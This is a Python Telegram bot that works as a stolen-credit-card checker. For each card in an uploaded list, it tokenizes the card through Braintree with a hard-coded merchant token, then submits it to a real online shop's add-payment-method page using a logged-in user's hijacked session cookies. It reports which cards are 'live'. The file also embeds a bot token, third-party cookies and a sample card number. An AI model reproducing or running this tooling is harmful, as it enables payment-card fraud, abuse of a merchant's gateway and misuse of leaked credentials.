"""
DIV » @D_X_A 

• TO USE THE FILE U NEED TO CHANGE SOMETHING
• RESPONSE LIVE OR DEAD IN LINE 442
• MESSAGE SEND IN LINE 437
• U CAN Do SOMETHING NICE IF U WANT TO
"""

from hh import keep_alive
import traceback 
import re
import telebot
from telebot.types import Message,InlineKeyboardButton,InlineKeyboardMarkup,Document
from telebot import TeleBot
import requests,time,re,user_agent
import requests
import uuid
import base64
bot = TeleBot(token='6914183037:AAHoTdg8fFVJRuL78cVnAH7bdYZEdEY2P5c')
def load_authorized_ids():
    with open('id.txt', 'r') as file:
        return [int(line.strip()) for line in file]

authorized_ids = load_authorized_ids()
allowed_user_id = 5667144845  #ADMIN
def is_allowed_user(user_id):
    return user_id == allowed_user_id

def is_authorized(message):
    return message.from_user.id in authorized_ids

@bot.message_handler(func=lambda message: not is_authorized(message))
def unauthorized_message(message):
    bot.reply_to(message, "أنت غير مصرح لك باستخدام هذا البوت. الرجاء التواصل مع المطور @D_X_A.")#رساله الغير مصرح لهم

@bot.message_handler(commands=['add_id'])
def add_id(message):
    user_id = message.from_user.id
    if is_allowed_user(user_id):
        user_to_add = int(message.text.split()[1])
        authorized_ids.append(user_to_add)

        with open('id.txt', 'a') as file:
            file.write(f"{user_to_add}\n")
        bot.reply_to(message, f"تمت إضافة معرف {user_to_add} بنجاح.")
    else:
        bot.reply_to(message, "ɴᴏᴛ ᴀᴠᴀɪʟᴀʙʟᴇ")

@bot.message_handler(commands=['remove_id'])
def remove_id(message):
    user_id = message.from_user.id
    if is_allowed_user(user_id):
        user_to_remove = int(message.text.split()[1])
        if user_to_remove == 6490101544:  
            bot.reply_to(message, "لا يمكن حذف المطور")
        elif user_to_remove in authorized_ids:
            authorized_ids.remove(user_to_remove)

            with open('id.txt', 'w') as file:
                for auth_id in authorized_ids:
                    file.write(f"{auth_id}\n")
            bot.reply_to(message, f"تمت إزالة معرف {user_to_remove} بنجاح.")
        else:
            bot.reply_to(message, "المعرف غير موجود.")
    else:
        bot.reply_to(message, "ɴᴏᴛ ᴀᴠᴀɪʟᴀʙʟᴇ")

decoded_bytes = base64.b64decode("4bSA4bSN4bSK4bSF")
DIV = decoded_bytes.decode('utf-8')
#REQ TRSHH 




@bot.message_handler(commands=['start', 'help'])
def start_help(m: Message):
    a = InlineKeyboardMarkup(row_width=1)
    a.add(
        InlineKeyboardButton(text='HSO', url='https://t.me/isHSONA')
    )
    name = f'<a href="tg://openmessage?user_id={m.chat.id}" target="_blank">{m.chat.first_name}</a>'.upper()
    bot.send_message(chat_id=m.chat.id, text=f'''
🤖 Bot Status: Active ✅

💡{name} TO RUN CHK SEND FILE CC

💳 AFTER CLEAN HIM !!
''', parse_mode='html',reply_to_message_id=m.message_id, reply_markup=a)

def get(query):
    proxies = {'https': '182.16.171.42:43188', 'http': '182.16.171.42:43188'}
    try:
        api = requests.get(f'https://lookup.binlist.net/{query}').json()
    except Exception as e:
        print(e)
        ch = '𝒖𝒏𝒌𝒏𝒐𝒘𝒏'
        cou = '𝒖𝒏𝒌𝒏𝒐𝒘𝒏'
        ra = '𝒖𝒏𝒌𝒏𝒐𝒘𝒏'
        emoji = '𝒖𝒏𝒌𝒏𝒐𝒘𝒏'
        ame = '𝒖𝒏𝒌𝒏𝒐𝒘𝒏'
        type = '𝒖𝒏𝒌𝒏𝒐𝒘𝒏'
        return ch, cou, ra, emoji, ame, type
    try:
        chh = api['scheme']
        ch = chh.upper()
    except:
        ch = '𝒖𝒏𝒌𝒏𝒐𝒘𝒏'
    try:
        typ = api['type']
        type = typ.upper()
    except:
        type = '𝒖𝒏𝒌𝒏𝒐𝒘𝒏'
    try:
        raa = api['brand']
        ra = raa.upper()
    except:
        ra = '𝒖𝒏𝒌𝒏𝒐𝒘𝒏'
    try:
        am = api['bank']['name']
        ame = am.upper()
    except:
        ame = '𝒖𝒏𝒌𝒏𝒐𝒘𝒏'
    try:
        co = api['country']['name']
        cou = co
    except:
        cou = '𝒖𝒏𝒌𝒏𝒐𝒘𝒏'
    try:
        emoji = api['country']['emoji']
    except:
        emoji = '𝒖𝒏𝒌𝒏𝒐𝒘𝒏'
    return ch, cou, ra, emoji, ame, type

@bot.message_handler(content_types=['document'])
def startCHECKER(d: Document):
    import requests
    p = d.document.file_id
    user = user_agent.generate_user_agent()
    a = bot.get_file(file_id=p)
    w = bot.download_file(file_path=a.file_path)
    print(d.document.file_name)
    with open(d.document.file_name, 'wb') as file:
        file.write(w)
    file = open(d.document.file_name, 'r').read().splitlines()
    msg = bot.send_message(chat_id=d.chat.id, text='Just a minute  ...', reply_to_message_id=d.id, parse_mode='html')
    dead = 0
    live = 0
    ch = 0
    risk = 0
    ccn = 0
    try:
        for e in file:
            cc = e.split('|')[0]
            mes = e.split('|')[1]
            ano = e.split('|')[2]
            ccv = e.split('|')[3]
            card = e.replace('\n', '')
            start_time = time.time()
            
            import requests

            headers = {
    'authority': 'payments.braintree-api.com',
    'accept': '*/*',
    'accept-language': 'ar-AE,ar;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6',
    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MTI0MDY0NDgsImp0aSI6ImIwODYwMGY1LWE0ZDItNGVmMS1iNTM2LWI0YTBlMmVmNDkzNSIsInN1YiI6Im56MnJjanI4bnB3Ym5wYnAiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6Im56MnJjanI4bnB3Ym5wYnAiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6e319.Qa4KM2v7Wd8TvgKjAGbbvwVtpeFS-fz5zxOuO6XtNRCEHEcVD8FhWtXiAC_3gSj27Wtln6MZUFmP_3CKFR69fA',
    'braintree-version': '2018-05-10',
    'content-type': 'application/json',
    'origin': 'https://assets.braintreegateway.com',
    'referer': 'https://assets.braintreegateway.com/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

            json_data = {
    'clientSdkMetadata': {
        'source': 'client',
        'integration': 'custom',
        'sessionId': 'cab84cd1-4cf4-42fa-a03e-4614ed3607dc',
    },
    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
    'variables': {
        'input': {
            'creditCard': {
                'number': cc,
                'expirationMonth': mes,
                'expirationYear': ano,
                'cvv': ccv,
            },
            'options': {
                'validate': False,
            },
        },
    },
    'operationName': 'TokenizeCreditCard',
}

            response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)

# Note: json_data will not be serialized by requests
# exactly as it was in the original request.
#data = '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"cab84cd1-4cf4-42fa-a03e-4614ed3607dc"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"4610460216497271","expirationMonth":"11","expirationYear":"2024","cvv":"263"},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}'
#response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, data=data)
            tk=(response.json()['data']['tokenizeCreditCard']['token'])

            import requests

            cookies = {
    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29',
    '_fbp': 'fb.1.1707844402557.112483748',
    'tracker_device': 'ba530b7f-78d6-41f2-bc62-349d8bbbb449',
    '__adroll_fpc': 'ec0d7e2b4dd4382c63678e261ed527b7-1707844406652',
    '_hjSessionUser_2999749': 'eyJpZCI6IjQ5OGEzYTM5LTNmOTEtNWIwOC04NjE1LTg5MGFiYjZmZDg1OSIsImNyZWF0ZWQiOjE3MDc4NDQ0MDc2MTUsImV4aXN0aW5nIjp0cnVlfQ==',
    'cookieconsent_status': 'dismiss',
    '_hjSessionUser_2857562': 'eyJpZCI6ImNjM2JkMjI1LTRiMWItNTE2Ny04YzFmLTk3MTQwOGU1Y2M5YSIsImNyZWF0ZWQiOjE3MDc4NzM2Njg0OTIsImV4aXN0aW5nIjp0cnVlfQ==',
    'sbjs_udata': 'vst%3D13%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36',
    '_gid': 'GA1.2.100342576.1712313836',
    '_hjSession_2999749': 'eyJpZCI6IjVlM2ZhMGNkLWU0ZWMtNDFhYi1iOGM5LTUxZDI4YmNkY2JlNyIsImMiOjE3MTIzMTM4MzczNjAsInMiOjAsInIiOjAsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjowLCJzcCI6MX0=',
    'wordpress_logged_in_5dba27ede1212f78b09603df5311a910': 'bbnnnn8833%7C1713523455%7C8lzABfU2dulBpZbZmYfvI38GwCRJFFgEJ40aFSHXMbQ%7C7a6e0c3d592d375995be216579e09ffbe03068709f46112c32ffce2ab39146bf',
    'wfwaf-authcookie-5978ff52dfcba7ba0f0a38bfa5fa4e5c': '1061%7Cother%7Cread%7C85118a1b23c6e8fe16f88d64541708b0a0e393550abc2bd1d26f5feacee72a42',
    'nitroCachedPage': '0',
    'sbjs_migrations': '1418474375998%3D1',
    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29',
    'sbjs_session': 'pgs%3D62%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.judefrances.com%2Fmy-account%2Fadd-payment-method%2F',
    '_gat_UA-217269131-1': '1',
    '__kla_id': 'eyJjaWQiOiJPRFl6WldZMk5UZ3ROalkxWlMwME5XVmtMV0V4TW1JdE4yVTFPRGRqTUdJM1l6WXgiLCIkZXhjaGFuZ2VfaWQiOiJqdWdfLTJ3ejY0cjc3LXZnVzBRbS15T3NDc0E3QXRPcEpmNkJVTmxrYUFNLlM1SGtUeSIsIiRyZWZlcnJlciI6eyJ0cyI6MTcxMjMxMzk1NCwidmFsdWUiOiJodHRwczovL3d3dy5qdWRlZnJhbmNlcy5jb20vbXktYWNjb3VudC9lZGl0LWFkZHJlc3MvYmlsbGluZy8iLCJmaXJzdF9wYWdlIjoiaHR0cHM6Ly93d3cuanVkZWZyYW5jZXMuY29tL215LWFjY291bnQvZWRpdC1hZGRyZXNzLyJ9LCIkbGFzdF9yZWZlcnJlciI6eyJ0cyI6MTcxMjMxOTk5MSwidmFsdWUiOiJodHRwczovL3d3dy5qdWRlZnJhbmNlcy5jb20vbXktYWNjb3VudC9lZGl0LWFkZHJlc3MvYmlsbGluZy8iLCJmaXJzdF9wYWdlIjoiaHR0cHM6Ly93d3cuanVkZWZyYW5jZXMuY29tL215LWFjY291bnQvZWRpdC1hZGRyZXNzLyJ9fQ==',
    '_ga': 'GA1.1.427364387.1707844401',
    '_ga_XGC2Z8PL72': 'GS1.2.1712313837.13.1.1712319992.0.0.0',
    '__ar_v4': 'PPL6BTAESZDMZAIXDVKCR4%3A20240405%3A31%7C33BZX763EZEP5CZNZBKNLN%3A20240405%3A31',
    '_gali': 'place_order',
    '_ga_WPW1H2P9K4': 'GS1.1.1712313834.13.1.1712320031.21.0.0',
}

            headers = {
    'authority': 'www.judefrances.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ar-AE,ar;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded',
    # 'cookie': 'sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29; _fbp=fb.1.1707844402557.112483748; tracker_device=ba530b7f-78d6-41f2-bc62-349d8bbbb449; __adroll_fpc=ec0d7e2b4dd4382c63678e261ed527b7-1707844406652; _hjSessionUser_2999749=eyJpZCI6IjQ5OGEzYTM5LTNmOTEtNWIwOC04NjE1LTg5MGFiYjZmZDg1OSIsImNyZWF0ZWQiOjE3MDc4NDQ0MDc2MTUsImV4aXN0aW5nIjp0cnVlfQ==; cookieconsent_status=dismiss; _hjSessionUser_2857562=eyJpZCI6ImNjM2JkMjI1LTRiMWItNTE2Ny04YzFmLTk3MTQwOGU1Y2M5YSIsImNyZWF0ZWQiOjE3MDc4NzM2Njg0OTIsImV4aXN0aW5nIjp0cnVlfQ==; sbjs_udata=vst%3D13%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36; _gid=GA1.2.100342576.1712313836; _hjSession_2999749=eyJpZCI6IjVlM2ZhMGNkLWU0ZWMtNDFhYi1iOGM5LTUxZDI4YmNkY2JlNyIsImMiOjE3MTIzMTM4MzczNjAsInMiOjAsInIiOjAsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjowLCJzcCI6MX0=; wordpress_logged_in_5dba27ede1212f78b09603df5311a910=bbnnnn8833%7C1713523455%7C8lzABfU2dulBpZbZmYfvI38GwCRJFFgEJ40aFSHXMbQ%7C7a6e0c3d592d375995be216579e09ffbe03068709f46112c32ffce2ab39146bf; wfwaf-authcookie-5978ff52dfcba7ba0f0a38bfa5fa4e5c=1061%7Cother%7Cread%7C85118a1b23c6e8fe16f88d64541708b0a0e393550abc2bd1d26f5feacee72a42; nitroCachedPage=0; sbjs_migrations=1418474375998%3D1; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29; sbjs_session=pgs%3D62%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.judefrances.com%2Fmy-account%2Fadd-payment-method%2F; _gat_UA-217269131-1=1; __kla_id=eyJjaWQiOiJPRFl6WldZMk5UZ3ROalkxWlMwME5XVmtMV0V4TW1JdE4yVTFPRGRqTUdJM1l6WXgiLCIkZXhjaGFuZ2VfaWQiOiJqdWdfLTJ3ejY0cjc3LXZnVzBRbS15T3NDc0E3QXRPcEpmNkJVTmxrYUFNLlM1SGtUeSIsIiRyZWZlcnJlciI6eyJ0cyI6MTcxMjMxMzk1NCwidmFsdWUiOiJodHRwczovL3d3dy5qdWRlZnJhbmNlcy5jb20vbXktYWNjb3VudC9lZGl0LWFkZHJlc3MvYmlsbGluZy8iLCJmaXJzdF9wYWdlIjoiaHR0cHM6Ly93d3cuanVkZWZyYW5jZXMuY29tL215LWFjY291bnQvZWRpdC1hZGRyZXNzLyJ9LCIkbGFzdF9yZWZlcnJlciI6eyJ0cyI6MTcxMjMxOTk5MSwidmFsdWUiOiJodHRwczovL3d3dy5qdWRlZnJhbmNlcy5jb20vbXktYWNjb3VudC9lZGl0LWFkZHJlc3MvYmlsbGluZy8iLCJmaXJzdF9wYWdlIjoiaHR0cHM6Ly93d3cuanVkZWZyYW5jZXMuY29tL215LWFjY291bnQvZWRpdC1hZGRyZXNzLyJ9fQ==; _ga=GA1.1.427364387.1707844401; _ga_XGC2Z8PL72=GS1.2.1712313837.13.1.1712319992.0.0.0; __ar_v4=PPL6BTAESZDMZAIXDVKCR4%3A20240405%3A31%7C33BZX763EZEP5CZNZBKNLN%3A20240405%3A31; _gali=place_order; _ga_WPW1H2P9K4=GS1.1.1712313834.13.1.1712320031.21.0.0',
    'origin': 'https://www.judefrances.com',
    'pragma': 'no-cache',
    'referer': 'https://www.judefrances.com/my-account/add-payment-method/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

            data = {
    'payment_method': 'braintree_credit_card',
    'wc-braintree-credit-card-card-type': 'visa',
    'wc-braintree-credit-card-3d-secure-enabled': '',
    'wc-braintree-credit-card-3d-secure-verified': '',
    'wc-braintree-credit-card-3d-secure-order-total': '0.00',
    'wc_braintree_credit_card_payment_nonce':tk,
    'wc_braintree_device_data': '{"correlation_id":"9e29725f12d071cfe701efd124d34943"}',
    'wc-braintree-credit-card-tokenize-payment-method': 'true',
    'woocommerce-add-payment-method-nonce': 'abe9a2394c',
    '_wp_http_referer': '/my-account/add-payment-method/',
    'woocommerce_add_payment_method': '1',
}

            response = requests.post('https://www.judefrances.com/my-account/add-payment-method/', cookies=cookies, headers=headers, data=data)
           


            #print(response.text)
            pattern = re.compile(r'<ul class="woocommerce-error" role="alert">\s*<li>(.+?)</li>\s*</ul>', re.DOTALL)

            match = pattern.search(response.text)
            d_time = time.time() - start_time
            if match:
                found_text = match.group()
                lines = found_text.split('\n')
                result = lines[2].strip()

            else:
                print("Response not find")
                found_text=response.text
                result="rejected"
            time.sleep(25)
            req=response
            if 'Payment method successfully' in req.text or 'Nice!' in req.text or 'exists in the vault.' in found_text or 'avs: Gateway Rejected: avs' in result:
                live+=1
                reason = '1000: Approved'
                print(f'{card} / {reason}')
                m = get(query=card[:6])
                bot.send_message(chat_id=d.chat.id, text=f'''
Approved Card ✅
━━━━━━━━━━━━━━━━━━━━
CC : {card}
Gateway : Auth B3
Status : Live ✅
Response : 1000: Approved
━━━━━━━ Bin Info ━━━━━━━
Bin Info : {m[0]} - {m[2]} - {m[5]}
Bank : {m[4]}
Country : {m[1]} {m[3]}
━━━━━━━━━━━━━━━━━━━━
Checker By - @isHSONA
                                    ''', parse_mode='html')
            elif '(C2 : CVV2 DECLINED)' in result:
                m = get(query=card[:6])
                print(result)
                ccn+=1
                bot.send_message(chat_id=d.chat.id, text=f'''み Th1Ch ↯ ↝ 𝙍𝙚𝙨𝙪𝙡𝙩
ᅳᅳᅳᅳᅳᅳᅳᅳᅳᅳᅳᅳᅳ
⸙ CC » {card}
⸙ Status » CCN ! ☑️
⸙ Result » 2010 Card Issuer Declined CVV ! ☑️
⸙ GateWay » B3 Charge
ᅳᅳᅳᅳᅳᅳᅳᅳᅳᅳᅳᅳᅳ
⸙ Info » {m[0]}  {m[2]}  {m[5]}
⸙ Bank » {m[4]}
⸙ Country » {m[1]} {m[3]}

⸙ T/t » {d_time:.2f}       Proxy » LIVE !
ᅳᅳᅳᅳᅳᅳᅳᅳᅳᅳᅳᅳᅳ
み Developed By ↝ {DIV}_↯  ''')
            elif 'Insufficient Funds' in result:
                m = get(query=card[:6])
                live+=1
                print(result)
                bot.send_message(chat_id=d.chat.id, text=f'''み Th1Ch ↯ ↝ 𝙍𝙚𝙨𝙪𝙡𝙩
ᅳᅳᅳᅳᅳᅳᅳᅳᅳᅳᅳᅳᅳ
⸙ CC » </a>{card}</a>
⸙ Status » CCV ! ✅
⸙ Result » APPROVED ! ✅
⸙ GateWay » B3 Charge
ᅳᅳᅳᅳᅳᅳᅳᅳᅳᅳᅳᅳᅳ
⸙ Info » {m[0]}  {m[2]}  {m[5]}
⸙ Bank » {m[4]}
⸙ Country » {m[1]} {m[3]}

⸙ T/t » {d_time:.2f}       Proxy » LIVE !
ᅳᅳᅳᅳᅳᅳᅳᅳᅳᅳᅳᅳᅳ
み Developed By ↝ {DIV}_↯  ''')
            else:
                reason = result
                r=reason
                print(r)
                if 'Gateway Rejected: risk_threshold' in reason:
                    risk+=1
                else:
                    dead+=1
            limit = len(file)
            checked = live+dead+risk
            button = InlineKeyboardMarkup(row_width=1)
            button.add(
                    InlineKeyboardButton(text=f'• {card} •', callback_data='card'),
                     InlineKeyboardButton(text=f'Response : {reason}', callback_data='reason'),
                    InlineKeyboardButton(text=f'𝗖𝗛𝗔𝗥𝗚𝗘 🔥: {int(ch)}', callback_data='ch'),
                    InlineKeyboardButton(text=f'LIVE ✅ : {int(live)}', callback_data='live'),
                    InlineKeyboardButton(text=f'𝗰𝗰𝗻 ✔☑️ : {int(ccn)}', callback_data='ccn'),
              InlineKeyboardButton(text=f'𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌ : {int(dead)}', callback_data='dead'),
                   InlineKeyboardButton(text=f'RISK ⚠️ : {int(risk)}', callback_data='risk'),
                                          InlineKeyboardButton(text=f'CHECKED 🗑 : {int(checked)}', callback_data='checked'),

                    InlineKeyboardButton(text=f'Limit 💳: {int(limit)}', callback_data='limit')
            )
            bot.edit_message_text(chat_id=d.chat.id, message_id=msg.message_id ,text=f'Checking in progress ~ HSO- @D_X_A.',
                                 parse_mode='html', reply_markup=button)
    except Exception as e:
        traceback.print_exc()
        pass
keep_alive()
bot.infinity_polling()